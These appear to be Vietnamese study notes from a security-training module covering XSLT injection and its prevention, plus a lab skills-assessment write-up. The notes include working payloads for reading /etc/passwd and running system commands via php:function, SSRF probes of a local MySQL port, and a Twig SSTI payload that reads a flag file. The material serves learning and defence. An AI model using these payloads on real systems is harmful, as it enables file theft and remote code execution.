* Như với mọi lỗ hổng injection khác, nhà phát triển phải **xác thực (validate)** và **làm sạch (sanitize)** kỹ lưỡng **user input** để ngăn SSI injection. Việc này đặc biệt quan trọng khi input của người dùng được sử dụng trong **SSI directives** hoặc được ghi (write) vào các file có thể chứa **SSI directives** theo cấu hình của **web server**.
* Cấu hình **web server** để hạn chế việc sử dụng **SSI** chỉ cho các **file extensions** cụ thể và, nếu có thể, chỉ cho các **directories** nhất định.
* Giới hạn khả năng của các **SSI directives** cụ thể để giảm thiểu tác động nếu có injection. Ví dụ, tắt **exec directive** nếu không cần thiết.



## &#x20;Intro to XSLT Injection

\
Giới thiệu về XSLT Injection

eXtensible Stylesheet Language Transformation (XSLT) là một ngôn ngữ cho phép biến đổi các tài liệu XML. Ví dụ, nó có thể chọn các node cụ thể từ một tài liệu XML và thay đổi cấu trúc XML.

### eXtensible Stylesheet Language Transformation (XSLT)

Vì XSLT vận hành trên dữ liệu dạng XML, ta sẽ xét tài liệu XML mẫu sau để minh hoạ cách XSLT hoạt động:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<fruits>
    <fruit>
        <name>Apple</name>
        <color>Red</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Banana</name>
        <color>Yellow</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Strawberry</name>
        <color>Red</color>
        <size>Small</size>
    </fruit>
</fruits>
```

XSLT được dùng để định nghĩa một định dạng dữ liệu rồi “enrich” (chèn dữ liệu) từ tài liệu XML. Dữ liệu XSLT có cấu trúc tương tự XML, nhưng chứa các XSL elements bên trong các node có tiền tố xsl- (xsl-prefix). Một số XSL elements thường dùng:

* `xsl:template`: chỉ ra một XSL template. Nó có thể có attribute `match` chứa đường dẫn trong tài liệu XML mà template đó áp dụng.
* `xsl:value-of`: trích giá trị của node XML được chỉ định trong attribute `select`.
* `xsl:for-each`: cho phép lặp trên các node XML được chỉ định trong attribute `select`.

Ví dụ, một XSLT đơn giản để xuất tất cả các fruit trong XML cùng màu sắc của chúng có thể như sau:

```xslt
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all the fruits:
		<xsl:for-each select="fruit">
			<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>
```

Như ta thấy, tài liệu XSLT chứa một `xsl:template` áp dụng cho node `<fruits>`. Template bao gồm chuỗi tĩnh `Here are all the fruits:` và một vòng lặp qua tất cả các node `<fruit>`. Với mỗi node, giá trị của `<name>` và `<color>` được in ra bằng `xsl:value-of`. Kết hợp XML mẫu với XSLT trên sẽ cho đầu ra:

```
Here are all the fruits:
    Apple (Red)
    Banana (Yellow)
    Strawberry (Red)
```

### Các XSL elements bổ sung

Các XSL elements khác có thể dùng để lọc hoặc tùy chỉnh dữ liệu:

* `xsl:sort`: chỉ định cách sắp xếp các phần tử trong vòng lặp `for-each` qua attribute `select`, và có thể chỉ định thứ tự với attribute `order`.
* `xsl:if`: dùng để kiểm tra điều kiện trên một node; điều kiện được đặt trong attribute `test`.

Ví dụ, dùng `xsl:sort` và `xsl:if` để tạo danh sách các fruit có `size = 'Medium'` và sắp theo `color` giảm dần:

```xslt
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all fruits of medium size ordered by their color:
		<xsl:for-each select="fruit">
			<xsl:sort select="color" order="descending" />
			<xsl:if test="size = 'Medium'">
				<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
			</xsl:if>
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>
```

Kết quả sẽ là:

```
Here are all fruits of medium size ordered by their color:
	Banana (Yellow)
	Apple (Red)
```

XSLT có thể dùng để sinh ra chuỗi output tuỳ ý. Ví dụ, các ứng dụng web có thể dùng XSLT để nhúng dữ liệu từ XML vào phản hồi HTML.

### XSLT Injection

Như tên gọi, XSLT injection xảy ra khi input của người dùng được chèn vào XSL data trước khi XSLT processor tạo output. Điều này cho phép attacker chèn thêm XSL elements vào XSL data, và XSLT processor sẽ thực thi các phần tử đó trong quá trình tạo output.



## Exploiting XSLT Injection

Sau khi đã thảo luận một số kiến thức cơ bản về XSLT, giờ ta đi vào cách khai thác lỗ hổng XSLT injection.

### Identifying XSLT Injection

Ứng dụng web mẫu của ta hiển thị thông tin cơ bản về một số module Academy:

`http://<SERVER_IP>:<PORT>/`\
List of favorite Academy modules with titles, authors, and tiers.

<figure><img src="../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

Ở cuối trang có form nhập username, username này được chèn vào tiêu đề ở đầu danh sách:

`http://<SERVER_IP>:<PORT>/`\
List of favorite Academy modules with titles, authors, and tiers, and a form to customize the list.

<figure><img src="../../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>

Nếu ứng dụng lưu thông tin module trong một tài liệu XML và render bằng XSLT, việc chèn trực tiếp tên người dùng vào XSLT data mà không sanitize có thể dẫn tới XSLT injection. Để xác minh, ta cố gắng chèn một thẻ XML hỏng để gây lỗi máy chủ, ví dụ nhập username là `<`. Kết quả:

`http://<SERVER_IP>:<PORT>/`\
HTTP GET request to /index.php with name parameter; response shows 500 Internal Server Error.

<figure><img src="../../.gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

Ứng dụng trả về lỗi server; điều này chưa khẳng định chắc XSLT injection nhưng là tín hiệu cho thấy có vấn đề bảo mật cần điều tra.

### Information Disclosure

Ta có thể cố gắng suy đoán thông tin về XSLT processor bằng cách chèn các XSLT element sau:

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

Nếu ứng dụng trả về thông tin phiên bản và vendor, điều đó xác nhận XSLT injection. Trong ví dụ, ta suy ra ứng dụng dùng **libxslt** và hỗ trợ XSLT version **1.0**.

<figure><img src="../../.gitbook/assets/image (581).png" alt=""><figcaption></figcaption></figure>

### Local File Inclusion (LFI)

Để đọc file cục bộ, có nhiều hàm khác nhau; payload có thành công hay không phụ thuộc vào XSLT version và cấu hình thư viện. Ví dụ hàm `unparsed-text` có thể đọc file:

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

Tuy nhiên `unparsed-text` chỉ xuất hiện từ XSLT 2.0, nên nếu processor chỉ hỗ trợ XSLT 1.0 thì payload này sẽ lỗi. Nếu XSLT library được cấu hình để hỗ trợ gọi PHP functions, ta có thể dùng `file_get_contents`:

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

Trong ví dụ, ứng dụng cho phép gọi PHP functions, nên nội dung file `/etc/passwd` được hiển thị trong phản hồi.

<figure><img src="../../.gitbook/assets/image (582).png" alt=""><figcaption></figcaption></figure>

### Remote Code Execution (RCE)

Nếu XSLT processor hỗ trợ gọi PHP functions, có thể gọi các hàm thực thi lệnh hệ thống để đạt RCE. Ví dụ gọi `system`:

```xml
<xsl:value-of select="php:function('system','id')" />
```

Khi hàm PHP `system` được gọi từ XSLT, kết quả lệnh (ví dụ `id`) sẽ được trả về — dẫn tới khả năng thực thi lệnh trên máy chủ.

### Kết luận ngắn

* XSLT injection xảy ra khi input người dùng bị chèn trực tiếp vào XSLT data trước khi xử lý.
* Xác định lỗ hổng bằng cách thử chèn ký tự/thẻ gây lỗi hoặc các element XSL để kiểm tra hành vi.
* Khai thác có thể dẫn tới information disclosure, LFI (tuỳ version/cấu hình), và RCE nếu processor cho phép gọi các hàm hệ thống (ví dụ qua `php:function`).
* Luôn chỉ kiểm thử trên hệ thống có quyền hoặc môi trường lab.



## &#x20;Preventing XSLT Injection

Preventing XSLT Injection

Sau khi đã thảo luận cách nhận diện và khai thác XSLT injection ở các phần trước, phần này sẽ kết luận bằng cách trình bày cách phòng ngừa lỗ hổng.

### Prevention

Tương tự như các lỗ hổng injection khác trong module này, XSLT injection có thể được ngăn chặn bằng cách đảm bảo rằng **user input** không bị chèn vào **XSL data** trước khi được xử lý bởi **XSLT processor**. Tuy nhiên, nếu đầu ra cần phản ánh các giá trị do người dùng cung cấp thì dữ liệu do người dùng cung cấp có thể buộc phải được thêm vào **XSL document** trước khi xử lý. Trong trường hợp đó, cần thực hiện **sanitize** và **validate** input một cách đúng đắn để tránh XSLT injection. Việc này có thể ngăn attacker chèn thêm XSLT elements, nhưng cách triển khai sẽ phụ thuộc vào định dạng đầu ra.

Ví dụ, nếu **XSLT processor** sinh ra phản hồi **HTML**, thì **HTML-encoding** dữ liệu người dùng trước khi chèn vào **XSL data** có thể ngăn chặn XSLT injection. Vì HTML-encoding chuyển mọi ký tự `<` thành `&lt;` và `>` thành `&gt;`, attacker sẽ không thể chèn thêm XSLT elements, do đó ngăn ngừa lỗ hổng XSLT injection.

Các biện pháp hardening bổ sung như chạy **XSLT processor** dưới một tiến trình có **low-privilege**, ngăn việc sử dụng external functions bằng cách tắt **PHP functions** trong XSLT, và giữ cho thư viện XSLT luôn được cập nhật cũng giúp giảm thiểu tác động nếu có XSLT injection.



<br>

## &#x20;Skills Assessment

Đầu tiên ta có giao diện của trang web :&#x20;

<figure><img src="../../.gitbook/assets/image (583).png" alt=""><figcaption></figcaption></figure>

Tôi nhận thấy có 1 gói req có dạng gửi `url` có thẻ gọi đây là `untrusted data` dưới dạng `url`

<figure><img src="../../.gitbook/assets/image (584).png" alt=""><figcaption></figcaption></figure>

Ta có thể phỏng đoán , đây khả năng là vuln `SSRF`

Sau khi brute thì ta nhận thấy port 3306 có vẻ đáng ngờ

<figure><img src="../../.gitbook/assets/image (262).png" alt=""><figcaption></figcaption></figure>

Khi gửi payload `api=https://127.0.0.1:3306/` tới endpoint `/` ứng dụng trả về lỗi từ thư viện TLS/HTTP client:\
`OpenSSL/3.0.15: error:0A00010B:SSL routines::wrong version number`.\
Kết hợp với kết quả trước (`Received HTTP/0.9 when not allowed` khi dùng `http://127.0.0.1:3306/`), đây là bằng chứng rõ ràng rằng server **đang thực hiện kết nối TCP** đến `127.0.0.1:3306` dựa trên giá trị `api` do client cung cấp — hành vi này là **SSRF**.

<figure><img src="../../.gitbook/assets/image (263).png" alt=""><figcaption></figcaption></figure>

### Bằng chứng (evidence)

* Request (POST body): `api=http://127.0.0.1:3306/` → Response body: `Error (1): Received HTTP/0.9 when not allowed`.
* Request (POST body): `api=https://127.0.0.1:3306/` → Response body: `OpenSSL/...: error:... wrong version number`.

hmm, tạm bỏ qua , tôi nghĩ nrnr chuyển qua hướng khác : Vì ở chương này ko chỉ học mỗi SSRF , và BOOM --> ta có SSTI , và web dc viết bằng PHP vậy nên , 100% sẽ là twig

<figure><img src="../../.gitbook/assets/image (264).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (265).png" alt=""><figcaption></figcaption></figure>

Ta ko thể escapce được dấu cách theo cách thông thường là %20 hay 1 số cách url encode khác, ta phải sử dụng đến hex encode

<figure><img src="../../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>

```url
http://truckapi.htb/?id%3D{{['cat\x20/flag.txt']|filter('system')}}
```

```
\x20 : 0x20
```



